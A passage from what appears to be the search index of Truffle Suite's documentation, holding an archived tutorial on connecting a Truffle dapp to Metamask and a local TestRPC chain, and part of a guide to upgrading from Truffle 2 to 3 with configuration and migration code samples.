Metamask will close at this point to restart itself. You can now sign into the dapp with Metamask. Open Metamask Enter your password Select an account Reload the Dapp page (some dapps will notice when you change accounts, but this basic one doesn't) You might notice you don't have any Metacoin in this account. That's a good thing! It means your new currency isn't going out to random accounts on the internet! To send some Metacoin to one of your Metamask accounts, you're going to need that account's address. To copy a Metamask account's address: Open Metamask Click the details arrow next to the account whose address you want. Click the \"Copy Address\" button. You now you have a copy of your address to send to! Switching Between TestRPC and Metamask Accounts \u00b6 When Metamask is installed, it intercepts calls and transactions to the Ethereum blockchain, and forwards them to its own RPC (which is currently on the test-network by default). Since Metamask is managing ethereum connections when it's installed, our Chrome browser right now can't access our testrpc accounts, because those accounts are managed by the testrpc node itself, so we need to open a browser without metamask. The easiest way to do this is to open an incognito window. You can also open another browser. Funding Your Metamask Account \u00b6 Once you're connected to your testrpc accounts again, you can send your Metacoin to whoever you please, including your new Metamask accounts. You might also notice that your new Metamask accounts don't have any ether in them. The testrpc initializes the blockchain with just its starting accounts having any balance, so to fund a Metamask account, you need to send some Ether to those accounts from one of your testrpc accounts. (In a future version of TestRPC there will probably be better ways to do this ). Here's a simple shell command to tell your testrpc to send 1 ether to your Metamask account. Let's assume 0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3 is the first account in your testrpc list, and 0xbbd220f66e989a493c4d48531ea1e283abc385de is one of your Metamask accounts. 1e18 is equal to 1 ether, which will be more than enough for our purposes. curl -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\": [{\"from\":\"0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3\", \"to\":\"0xbbd220f66e989a493c4d48531ea1e283abc385de\", \"value\": 1e18}], \"id\":1}' -X POST http://127.0.0.1:8545/ Synchronizing Accounts Between Metamask And Testrpc \u00b6 If you want to use testrpc/Metamask combination for development purposes, another route to get the accounts in Metamask to be useful with testrpc is to use the HD wallet generation that both support. If you start testrpc it creates 10 different addresses that can be recovered by the supplied mnemonic. The `testrpc output show the 10 inital accounts, the 10 private keys for the accounts and the mnemonic to recreate those accounts. Available Accounts ================== (0) 0x0b488d56e55996ea868e6bc640a59d10c71ff4e7 ... (9) 0x4decace9430b32cfd72ed99656adf80ebf23931d Private Keys ================== (0) cb99e7dfaf138af48dde4e863f6dca0ab0acfad29f95954f08796f962656d5c8 ... (9) 29f734be35466ed5a62d0c7387412bc73d533bc24197cdcf2b8bbac8a982b198 HD Wallet ================== Mnemonic: rubber negative firm purity helmet barely six asset imitate nephew october pluck Base HD Path: m/44'/60'/0'/0/{account_index} If you use that mnemonic in Metamask to restore an existing vault instead of creating a new one Metamask will use the same accounts. Testrpc also support a command line option to supply the mnemonic instead of using a random one. Starting it with testrpc -m \"rubber negative firm purity helmet barely six asset imitate nephew october pluck\" will give you the same accounts each time. That way you don't have to setup Metamask every time to use a new mnemonic. Sending Metacoin from Metamask: So Meta! \u00b6 Now if we connect to our Dapp via Metamask, we should see we have some MetaCoin, and if we look in our Metamask plugin, we should have 1 ether too! It's important that we have ether, because it's not only a currency for trade, it's also the currency for processing transactions on the Ethereum blockchain. This processing fee is referred to as \"gas\". Let's try sending some Metacoin from one of our Metamask accounts to another. First select the account that has the Metacoin and Ether. Now click the details arrow for another account, and copy its address ( COPY ADDR ). Paste the address into the Dapp window, along with how much Metacoin you'd like to send, and hit send ! You should see a notification pop-up, notifying you that you have a transaction to approve in Metamask. You can either click \"Approve\" on the notification, or open the Metamask pop-up and review the transaction there. This is one way that Metamask is a safer Ethereum browsing experience than running your own RPC. While a pre-authenticated RPC automatically approves all requests sent to it, Metamask gives the user an opportunity to review and approve or reject each transaction that's requested by the dapp. Long term, making transactions easy to intelligently review is an important priority for Ethereum developers. Wrapping Up \u00b6 This has been a simple example, but hopefully shows how Truffle and Metamask work together. They are able to pretty much work out of the box! That's because Truffle helps you write web3 -compliant dapps. Web3 is a Javascript API declared by the core Ethereum team, and since it was standardized early, tools that take advantage of its common methods work well together. This makes connecting to a Truffle Dapp with Metamask not much harder than connecting via your own RPC, but it's a lot easier for your users. That's because Metamask is a hyper-light client that doesn't replicate the entire blockchain locally, but it does let users manage their own accounts, so they can casually benefit from the security of private key management, while placing trust for block validation on Metamask's configured RPC provider. We hope this has been a useful introduction to developing with Truffle and Metamask! Please, leave a comment or question, start a discussion on github , or Tweet at us on Twitter . We're trying to make Metamask the easiest tool to let anyone benefit from using Distributed Apps on the Ethereum Blockchain.","title":"Truffle Suite"},{"location":"guides/truffle-and-metamask/index.html#installing-truffle-dependencies","text":"You're going to need to have installed node.js . From there, you need to install truffle ( npm install -g truffle ). Also, you're going to need to run a local blockchain RPC server to test and develop against. I recommend using TestRPC , which you install by running npm install -g ethereumjs-testrpc . Next let's make sure we have our testrpc running in the background. Open your terminal and run the command testrpc . That's all! It runs on port 8545 by default, just like most Ethereum RPCs, and so does Truffle.","title":"Installing Truffle Dependencies"},{"location":"guides/truffle-and-metamask/index.html#quick-note-on-rpcs","text":"Ethereum RPCs can run in a pre-authenticated mode, that allows you to perform transactions without providing any additional credentials. Obviously this would be a dangerous thing to do on the open web, but for local development, it's the default method that testrpc provides. When you first start testrpc , You get a list of initial accounts. These accounts start funded with a whole lot of Ether, so you can practice exchanging funds between accounts. When you open a normal Truffle Dapp, it takes advantage of your local authenticated rpc, and has access to its account list. The default Truffle dapp just uses the first account in the list.","title":"Quick Note on RPCs"},{"location":"guides/truffle-and-metamask/index.html#setting-up-a-simple-truffle-dapp","text":"Next, let's generate a basic Truffle dapp. The default result of truffle init is a simple example currency. To get it up and running, run these commands: mkdir my-money # Create a folder for your new dapp cd my-money # Move into that folder truffle init # Initialize a default truffle project in that folder truffle build # Compile the dapp truffle migrate # Publish the dapp on the blockchain truffle serve # Host your web interface on port 8080 We just deployed a simple alt-coin called MetaCoin to our local blockchain, and it's available to our browser on http://127.0.0.1:8080 ! If you visit it, you'll see that by default this new Dapp template signs you in with the first account on your testrpc account list, which happens to be the same account that got pre-populated with 10k shiny new Metacoins! That's because when you ran truffle migrate , Truffle used your first account as the contract publisher, and the contract says to fund the creator's account with 10k coins. If you don't see any Metacoin in this account, it may be because you have Metamask already installed. Jump down to \"Switching between TestRPC and Metamask accounts\" below. You can now send those coins to any account you want, so let's now set up some Metamask accounts, and then we can fund them!","title":"Setting up a Simple Truffle Dapp"},{"location":"guides/truffle-and-metamask/index.html#setting-up-metamask","text":"Now you'll want to install Metamask from the Chrome store . Metamask is currently not listed on the Chrome store, but you get that link because you're an early adopter who we want to support. When first setting up Metamask, you'll need to provide a password (used to encrypt your wallet). It is then going to generate a unique twelve-word phrase that you'll eventually be able to use to recover all your accounts.We haven't done that yet because this is just a developer preview! Please don't use Metamask for important things yet! By default you get three accounts, all named Wallie. Again, our developer preview is showing. Eventually we're planning to integrate rich persona management via uPort !). To use Metamask with your local development blockchain, you need to point it at your testrpc . Open Metamask Click the gear icon in the bottom left Enter your testrpc address into the RPC field. It's probably http://127.0.0.1:8545/ . Metamask will close at this point to restart itself. You can now sign into the dapp with Metamask. Open Metamask Enter your password Select an account Reload the Dapp page (some dapps will notice when you change accounts, but this basic one doesn't) You might notice you don't have any Metacoin in this account. That's a good thing! It means your new currency isn't going out to random accounts on the internet! To send some Metacoin to one of your Metamask accounts, you're going to need that account's address. To copy a Metamask account's address: Open Metamask Click the details arrow next to the account whose address you want. Click the \"Copy Address\" button. You now you have a copy of your address to send to!","title":"Setting up Metamask"},{"location":"guides/truffle-and-metamask/index.html#switching-between-testrpc-and-metamask-accounts","text":"When Metamask is installed, it intercepts calls and transactions to the Ethereum blockchain, and forwards them to its own RPC (which is currently on the test-network by default). Since Metamask is managing ethereum connections when it's installed, our Chrome browser right now can't access our testrpc accounts, because those accounts are managed by the testrpc node itself, so we need to open a browser without metamask. The easiest way to do this is to open an incognito window. You can also open another browser.","title":"Switching Between TestRPC and Metamask Accounts"},{"location":"guides/truffle-and-metamask/index.html#funding-your-metamask-account","text":"Once you're connected to your testrpc accounts again, you can send your Metacoin to whoever you please, including your new Metamask accounts. You might also notice that your new Metamask accounts don't have any ether in them. The testrpc initializes the blockchain with just its starting accounts having any balance, so to fund a Metamask account, you need to send some Ether to those accounts from one of your testrpc accounts. (In a future version of TestRPC there will probably be better ways to do this ). Here's a simple shell command to tell your testrpc to send 1 ether to your Metamask account. Let's assume 0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3 is the first account in your testrpc list, and 0xbbd220f66e989a493c4d48531ea1e283abc385de is one of your Metamask accounts. 1e18 is equal to 1 ether, which will be more than enough for our purposes. curl -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\",\"params\": [{\"from\":\"0x0f91747e3a5df28d81ab30b2d8216c93263c0cf3\", \"to\":\"0xbbd220f66e989a493c4d48531ea1e283abc385de\", \"value\": 1e18}], \"id\":1}' -X POST http://127.0.0.1:8545/","title":"Funding Your Metamask Account"},{"location":"guides/truffle-and-metamask/index.html#synchronizing-accounts-between-metamask-and-testrpc","text":"If you want to use testrpc/Metamask combination for development purposes, another route to get the accounts in Metamask to be useful with testrpc is to use the HD wallet generation that both support. If you start testrpc it creates 10 different addresses that can be recovered by the supplied mnemonic. The `testrpc output show the 10 inital accounts, the 10 private keys for the accounts and the mnemonic to recreate those accounts. Available Accounts ================== (0) 0x0b488d56e55996ea868e6bc640a59d10c71ff4e7 ... (9) 0x4decace9430b32cfd72ed99656adf80ebf23931d Private Keys ================== (0) cb99e7dfaf138af48dde4e863f6dca0ab0acfad29f95954f08796f962656d5c8 ... (9) 29f734be35466ed5a62d0c7387412bc73d533bc24197cdcf2b8bbac8a982b198 HD Wallet ================== Mnemonic: rubber negative firm purity helmet barely six asset imitate nephew october pluck Base HD Path: m/44'/60'/0'/0/{account_index} If you use that mnemonic in Metamask to restore an existing vault instead of creating a new one Metamask will use the same accounts. Testrpc also support a command line option to supply the mnemonic instead of using a random one. Starting it with testrpc -m \"rubber negative firm purity helmet barely six asset imitate nephew october pluck\" will give you the same accounts each time. That way you don't have to setup Metamask every time to use a new mnemonic.","title":"Synchronizing Accounts Between Metamask And Testrpc"},{"location":"guides/truffle-and-metamask/index.html#sending-metacoin-from-metamask-so-meta","text":"Now if we connect to our Dapp via Metamask, we should see we have some MetaCoin, and if we look in our Metamask plugin, we should have 1 ether too! It's important that we have ether, because it's not only a currency for trade, it's also the currency for processing transactions on the Ethereum blockchain. This processing fee is referred to as \"gas\". Let's try sending some Metacoin from one of our Metamask accounts to another. First select the account that has the Metacoin and Ether. Now click the details arrow for another account, and copy its address ( COPY ADDR ). Paste the address into the Dapp window, along with how much Metacoin you'd like to send, and hit send ! You should see a notification pop-up, notifying you that you have a transaction to approve in Metamask. You can either click \"Approve\" on the notification, or open the Metamask pop-up and review the transaction there. This is one way that Metamask is a safer Ethereum browsing experience than running your own RPC. While a pre-authenticated RPC automatically approves all requests sent to it, Metamask gives the user an opportunity to review and approve or reject each transaction that's requested by the dapp. Long term, making transactions easy to intelligently review is an important priority for Ethereum developers.","title":"Sending Metacoin from Metamask: So Meta!"},{"location":"guides/truffle-and-metamask/index.html#wrapping-up","text":"This has been a simple example, but hopefully shows how Truffle and Metamask work together. They are able to pretty much work out of the box! That's because Truffle helps you write web3 -compliant dapps. Web3 is a Javascript API declared by the core Ethereum team, and since it was standardized early, tools that take advantage of its common methods work well together. This makes connecting to a Truffle Dapp with Metamask not much harder than connecting via your own RPC, but it's a lot easier for your users. That's because Metamask is a hyper-light client that doesn't replicate the entire blockchain locally, but it does let users manage their own accounts, so they can casually benefit from the security of private key management, while placing trust for block validation on Metamask's configured RPC provider. We hope this has been a useful introduction to developing with Truffle and Metamask! Please, leave a comment or question, start a discussion on github , or Tweet at us on Twitter . We're trying to make Metamask the easiest tool to let anyone benefit from using Distributed Apps on the Ethereum Blockchain.","title":"Wrapping Up"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Note: This guide also applies to users upgrading from Truffle beta 3.0.0-9 to Truffle 3.0.1 Introduction \u00b6 Truffle 3.0 offers a ton of new features. With it comes some very important breaking changes. These breaking changes make network management easier, make contract abstractions easier to use, and allow you to install third party packages from any number of sources. We consider these breaking changes helpful -- they're due to the careful maturation of Ethereum's most popular development tool, and we'll guide you through the steps needed to take advantage of all these new features. In order to show you code samples that describe the evolution from 2.0 to 3.0, we're going to use examples like this: v2.0: // This is old code from Truffle 2.0 v3.0: // This is new code for Truffle 3.0! Now let's get started! First Things First: Configuration \u00b6 Truffle 2.0 had an odd configuration -- we admit it. Not only can you have a default, unnamed network sitting around (the rpc configuration option) but you can also have named networks like \"ropsten\" or \"live\" . A result of this default vs. named distinction came were other oddities, such as accidentally overwriting important network artifacts or deploying to the wrong network. With Truffle 3.0 we fixed all that, but it requires a change in your configuration. In v2.0, a configuration with a named network might look like this: module . exports = { rpc : { host : \"localhost\" , port : 8545 }, networks : { staging : { host : \"localhost\" , port : 8546 , network_id : 1337 }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 } } }; In v3.0, this same configuration would look like this: module . exports = { networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" }, staging : { host : \"localhost\" , port : 8546 , network_id : 1337 }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 } } }; What's the difference? First, there's no default network anymore: the rpc configuration item has been removed. In its place is a specially named development network. This is a network that will match any network it connects to at the specified host and port, and when running commands like migrate Truffle will default to this network if none is specified. If you'd like to protect yourself from deploying to the wrong network completely, you can remove the development configuration entirely; if you don't specify the network via truffle migrate --network ropsten , for example, Truffle will exit with an error, ensuring you never deploy to a network you don't intend to. Additionally, each network needs to have a network id specified, or a \"*\" . This is another security measure used during migrations to ensure that even if Truffle connects to the Ethereum client at the specified host and port, if it's not the network you intend, Truffle will error before attempting any deployments. Importing and the Ethereum Package Manager (EthPM) \u00b6 As Truffle 3.0 uses the new Ethereum Package Manager (EthPM) we need to tell Truffle when the package manager should be used and when to look in the local directory. If you don't specify the directory to search relative to the contracts/ directory, it will assume that EthPM will handle this. So to import a local file: v2.0: import \"test.sol\" v3.0: import \"./test.sol\" The ./ tells Truffle that the contract is in the current directory. See the Compiling contracts page for more details. Migrations and Test Dependencies \u00b6 Before package management, Truffle could assume that all the contracts you wrote yourself were the contracts you wanted to interact with via your migrations and tests. Now that package management is here, this is no longer a safe assumption -- contract dependencies can come from any number of sources, and so you have to explicitly ask for those abstractions yourself. This is all in the name of reducing magic. Let's look at an example migration. v2.0 : ./migrations/2_deploy_contracts.js module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . autolink (); deployer . deploy ( MetaCoin ); }; v3.0 : ./migrations/2_deploy_contracts.js var ConvertLib = artifacts . require ( \"ConvertLib.sol\" ); var MetaCoin = artifacts . require ( \"MetaCoin.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . link ( ConvertLib , MetaCoin ); deployer . deploy ( MetaCoin ); }; Note there are a couple differences. For this section, the changes we'll focus on are the two lines which use artifacts.require() . This is a function similar to Node's require() statement provided by Truffle. If given a path to a solidity file local to your project, or the path of a package dependency, this function will locate the correct artifacts and make them ready for use on your current network. Your Javascript tests need the exact same artifacts.require() statements in order to use those abstractions like before. Migrations: No more autolink \u00b6 Like the section above, autolinking was a boon of a very small dependency tree. With package management, Truffle can no longer autolink your contracts because it can't determine all possible dependencies you might need within your migration. Instead, you need to explicitly link your libraries yourself. Fortunately this is not hard, and you can see the changes we made in the example above. Contract Abstractions: All JSON (goodbye .sol.js!) \u00b6 Truffle had originally saved your contract abstractions on disk in .sol.js files. These files were Javascript files that represented specific solidity files in your project, hence the file extension, and they were originally intended to make your contract artifacts really easy to use, everywhere. Well, it turns out we got it wrong. Really wrong. Not only were these files hard to use within Javascript in certain cases, but they were completely unusable if you wanted to use them outside of Javascript. To overcome this limitation and make your contract artifacts available everywhere, Truffle 3.0 now saves all artifacts within the JSON format. So what should you do if you've been using Truffle 2.0 and have important contract artifacts you'd like to save? Easy. Upgrade them! We built you a handy tool that does just that. To upgrade your .sol.js files, first install truffle-soljs-updater globally via npm: $ npm install -g truffle-soljs-updater This will provide the sjsu command available for your use. Next, navigate to the directory where your .sol.js files are stored (usually ./build/contracts ), and run sjsu . Your output should look something like this: $ cd ./build/contracts $ sjsu Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. By default sjsu only creates newer, .json versions of your artifacts and leaves the original .sol.js files alone. You'll need to remove the .sol.js files from this directory in order for Truffle 3.0 to function properly. Before removing, check to ensure that the converted .json files were created properly, and perhaps as a safeguard backup your old .sol.js files somewhere else before continuing. Once you're sure all data was copied correctly and you have a nice backup, you can run sjsu with the -f parameter. This will tell sjsu to delete the existing .sol.js files. Your output should look something like this: $ cd ./build/contracts $ sjsu -f Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. Successfully deleted old .sol.js files. And that's it! You're now ready to move onto the next step. Contract Abstractions: .deployed() is now thennable \u00b6 \u26a0\ufe0f Warning: This change will affect your migrations, your tests, and your application code! \u26a0\ufe0f In Truffle 2.0, your contract abstractions managed your networks in a naive way, and added constructs like a \"default network\" that opened up the possibility of using the wrong network artifacts and deployed addresses at the wrong time. This provided a fancy and easy to use syntax -- i.e., MyContract.deployed().myFunction(...) -- but it left your code open to errors. Truffle 3.0 changes this syntax, where .deployed() is now thennable, like a promise (see example below). Similarly, this makes your contract abstractions seamlessly integrate with EIP 190 , Ethereum's package management standard. All of this is for the better, but it means you'll have some changes to make all across the board. In the general use case, here is how the new syntax differs from the old: v2.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed (). someFunction (). then ( function ( tx ) { // Do something after the someFunction() transaction executed }); v3.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed (). then ( function ( instance ) { return instance . someFunction (); }). then ( function ( result ) { // Do something after the someFunction() transaction executed }); This syntax is a little more verbose, but it ensures the correct network artifacts are used based on the Ethereum client the abstraction is connected to. Note that in v3.0, you may need to correctly scope your deployed instance if you want to perform multiple actions with it in the same promise chain: MyContract . setProvider ( someWeb3Provider ); var deployed ; MyContract . deployed (). then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }). then ( function ( result ) { return deployed . anotherFunction (); }). then ( function ( result ) { // etc. }); Contract Abstractions: Transaction result objects \u00b6 People have long complained that events are hard to watch for in Web3. Similarly, in most use cases, events aren't used via a contract observer pattern; instead, in practice, events are used to check specific results of a specific transaction. Though the contract observer pattern for events is still available, we made the latter use case much easier, which required breaking changes to the return value of transactions. In v2.0, a transaction simply returned the transaction hash. In v3.0, transactions return a result object with a wealth of information about that transaction. v2.0 MyContract . deployed (). someFunction (). then ( function ( tx ) { // tx is the transaction id (hash) of the transaction executed }); v3.0 MyContract . deployed (). then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }). then ( function ( result ) { // result is an object with the following values: // // result.tx => transaction hash, string // result.logs => array of decoded events that were triggered within this transaction // result.receipt => transaction receipt object, which includes gas used }); In Truffle 3.0, it's now much easier to detect if an event was fired as a result of your transaction. Here's a Javascript test for a hypothetical PackageIndex contract and ReleasePublished event: var assert = require ( \"assert\" ); var PackageIndex = artifacts . require ( \"PackageIndex.sol\" ); contract ( \"PackageIndex\" , function ( accounts ) { it ( \"publishes a release correctly\" , function () { return PackageIndex . deployed (). then ( function ( deployed ) { return deployed . publish ( \"v2.0.0\" ); }). then ( function ( result ) { // This result object is what provides us with the information we need. // result.logs, specifically for this example. var found_published_event = false ; for ( var i = 0 ; i < result . logs . length ; i ++ ) { var log = result . logs [ i ]; if ( log . event == \"ReleasePublished\" ) { found_published_event = true ; break ; } } assert ( found_published_event , \"Uh oh! We didn't find the published event!\" ) }); }); }); We have to search through all returned events to ensure we found the one we wanted, but this is certainly better than using PackageIndex.ReleasePublished.watch(...) , and we can keep event processing within our application's (or test's) normal control flow. Build Pipeline: No more builder, by default \u00b6 In Truffle 1.0 and 2.0, things were heavily geared toward building web applications, and so Truffle shipped with a default build pipeline that could get your dapp up and running quickly. This build pipeline was magical: It did everything for you, and you didn't have to lift a finger. This was good for some use cases, but it became evidently clear that in any other use case the pipeline was very brittle. Over the last year, Ethereum-enabled applications have only been growing. What started out as solely a platform for web application, now dapps can be written in native languages and run as standalone applications on mobile and the desktop. Truffle has always intended to support these use cases, and so that's why we removed the default build pipeline from Truffle. You can still write your own custom build pipeline if you'd like to tightly integrate it with Truffle, but by default Truffle will focus on continuing to be the best tool for smart contracts around. We'll let the better build pipelines -- like webpack , browserify , Grunt , Metalsmith -- do the job of, well, building. Now, just because the build pipeline has been removed by default doesn't mean you don't have options. At Truffle, we care about your developer experience and so would never leave you hanging. In general there are two options for you to choose from, but for the latter option what you'll do is heavily dependent on which build tool (i.e., webpack) you choose to use. Let's go over the options below. Use the old pipeline in Truffle 3.0 \u00b6 If you're using the default build pipeline in Truffle 2.0 and would like to upgrade to 3.0, you're not out of luck. We've upgraded the truffle-default-builder so it can work seamlessly with Truffle 3.0. This will be the last time we update the default builder though as engineering for all possible use cases is too complex. So we recommend you eventually choose a different build system later down the line. The default builder no longer ships with Truffle by default. So for Truffle 3.0, you first need to make truffle-default-builder a dependency of your project by running the following command within your project's folder: $ npm install truffle-default-builder --save Once installed, you can use the default builder within your truffle.js configuration file. Let's have a look at how your configuration file changes from v2.0 to v3.0, using a very simple build configuration: v2.0 : truffle.js module . exports = { build : { \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" }, rpc : { host : \"localhost\" , port : 8545 } }; v3.0 : truffle.js var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder ({ \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" }), networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" // Match any network id } } }; You'll notice that in version 3.0 we require 'd the default builder as a dependency and then passed that object into our configuration. Otherwise, the configuration was the same! Now, be aware that the default builder does use the latest contract abstractions ( truffle-contract ), so you will still need to edit your application to account for the breaking changes mentioned above. Use a custom build process / build tool \u00b6 Custom build processes are not hard to write. Instead, what's hard is writing a build process that fits all shapes and sizes. We now recommend you look into the many build tools available to you that best fits your application. We've already mentioned webpack , browserify , Grunt , and Metalsmith , but there are many others, and their features run the gamut based on the context of the application being built and the features that you need. Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps; Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. Turn those .json contract artifacts into contract abstractions that are easy to use, via truffle-contract . Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"truffle-contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://localhost:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly. Fin \u00b6 That's it! That's all you need to know to upgrade from Truffle 2.0 to 3.0. It might require a bit of work, but the changes are surely worth it. If you have questions, Truffle has a vibrant community of Trufflers available 24/7 to help you with any issues you may have. Don't hesitate to ask for help, and we wish you a happy 3.0! -- The Truffle Team","title":"Truffle Suite"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#introduction","text":"Truffle 3.0 offers a ton of new features. With it comes some very important breaking changes. These breaking changes make network management easier, make contract abstractions easier to use, and allow you to install third party packages from any number of sources. We consider these breaking changes helpful -- they're due to the careful maturation of Ethereum's most popular development tool, and we'll guide you through the steps needed to take advantage of all these new features. In order to show you code samples that describe the evolution from 2.0 to 3.0, we're going to use examples like this: v2.0: // This is old code from Truffle 2.0 v3.0: // This is new code for Truffle 3.0! Now let's get started!","title":"Introduction"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#first-things-first-configuration","text":"Truffle 2.0 had an odd configuration -- we admit it. Not only can you have a default, unnamed network sitting around (the rpc configuration option) but you can also have named networks like \"ropsten\" or \"live\" . A result of this default vs. named distinction came were other oddities, such as accidentally overwriting important network artifacts or deploying to the wrong network. With Truffle 3.0 we fixed all that, but it requires a change in your configuration. In v2.0, a configuration with a named network might look like this: module . exports = { rpc : { host : \"localhost\" , port : 8545 }, networks : { staging : { host : \"localhost\" , port : 8546 , network_id : 1337 }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 } } }; In v3.0, this same configuration would look like this: module . exports = { networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" }, staging : { host : \"localhost\" , port : 8546 , network_id : 1337 }, ropsten : { host : \"158.253.8.12\" , port : 8545 , network_id : 3 } } }; What's the difference? First, there's no default network anymore: the rpc configuration item has been removed. In its place is a specially named development network. This is a network that will match any network it connects to at the specified host and port, and when running commands like migrate Truffle will default to this network if none is specified. If you'd like to protect yourself from deploying to the wrong network completely, you can remove the development configuration entirely; if you don't specify the network via truffle migrate --network ropsten , for example, Truffle will exit with an error, ensuring you never deploy to a network you don't intend to. Additionally, each network needs to have a network id specified, or a \"*\" . This is another security measure used during migrations to ensure that even if Truffle connects to the Ethereum client at the specified host and port, if it's not the network you intend, Truffle will error before attempting any deployments.","title":"First Things First: Configuration"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#importing-and-the-ethereum-package-manager-ethpm","text":"As Truffle 3.0 uses the new Ethereum Package Manager (EthPM) we need to tell Truffle when the package manager should be used and when to look in the local directory. If you don't specify the directory to search relative to the contracts/ directory, it will assume that EthPM will handle this. So to import a local file: v2.0: import \"test.sol\" v3.0: import \"./test.sol\" The ./ tells Truffle that the contract is in the current directory. See the Compiling contracts page for more details.","title":"Importing and the Ethereum Package Manager (EthPM)"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#migrations-and-test-dependencies","text":"Before package management, Truffle could assume that all the contracts you wrote yourself were the contracts you wanted to interact with via your migrations and tests. Now that package management is here, this is no longer a safe assumption -- contract dependencies can come from any number of sources, and so you have to explicitly ask for those abstractions yourself. This is all in the name of reducing magic. Let's look at an example migration. v2.0 : ./migrations/2_deploy_contracts.js module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . autolink (); deployer . deploy ( MetaCoin ); }; v3.0 : ./migrations/2_deploy_contracts.js var ConvertLib = artifacts . require ( \"ConvertLib.sol\" ); var MetaCoin = artifacts . require ( \"MetaCoin.sol\" ); module . exports = function ( deployer ) { deployer . deploy ( ConvertLib ); deployer . link ( ConvertLib , MetaCoin ); deployer . deploy ( MetaCoin ); }; Note there are a couple differences. For this section, the changes we'll focus on are the two lines which use artifacts.require() . This is a function similar to Node's require() statement provided by Truffle. If given a path to a solidity file local to your project, or the path of a package dependency, this function will locate the correct artifacts and make them ready for use on your current network. Your Javascript tests need the exact same artifacts.require() statements in order to use those abstractions like before.","title":"Migrations and Test Dependencies"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#migrations-no-more-autolink","text":"Like the section above, autolinking was a boon of a very small dependency tree. With package management, Truffle can no longer autolink your contracts because it can't determine all possible dependencies you might need within your migration. Instead, you need to explicitly link your libraries yourself. Fortunately this is not hard, and you can see the changes we made in the example above.","title":"Migrations: No more autolink"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#contract-abstractions-all-json-goodbye-soljs","text":"Truffle had originally saved your contract abstractions on disk in .sol.js files. These files were Javascript files that represented specific solidity files in your project, hence the file extension, and they were originally intended to make your contract artifacts really easy to use, everywhere. Well, it turns out we got it wrong. Really wrong. Not only were these files hard to use within Javascript in certain cases, but they were completely unusable if you wanted to use them outside of Javascript. To overcome this limitation and make your contract artifacts available everywhere, Truffle 3.0 now saves all artifacts within the JSON format. So what should you do if you've been using Truffle 2.0 and have important contract artifacts you'd like to save? Easy. Upgrade them! We built you a handy tool that does just that. To upgrade your .sol.js files, first install truffle-soljs-updater globally via npm: $ npm install -g truffle-soljs-updater This will provide the sjsu command available for your use. Next, navigate to the directory where your .sol.js files are stored (usually ./build/contracts ), and run sjsu . Your output should look something like this: $ cd ./build/contracts $ sjsu Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. By default sjsu only creates newer, .json versions of your artifacts and leaves the original .sol.js files alone. You'll need to remove the .sol.js files from this directory in order for Truffle 3.0 to function properly. Before removing, check to ensure that the converted .json files were created properly, and perhaps as a safeguard backup your old .sol.js files somewhere else before continuing. Once you're sure all data was copied correctly and you have a nice backup, you can run sjsu with the -f parameter. This will tell sjsu to delete the existing .sol.js files. Your output should look something like this: $ cd ./build/contracts $ sjsu -f Converting ConvertLib.sol.js... Converting MetaCoin.sol.js... Converting Migrations.sol.js... Files converted successfully. Successfully deleted old .sol.js files. And that's it! You're now ready to move onto the next step.","title":"Contract Abstractions: All JSON (goodbye .sol.js!)"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#contract-abstractions-deployed-is-now-thennable","text":"\u26a0\ufe0f Warning: This change will affect your migrations, your tests, and your application code! 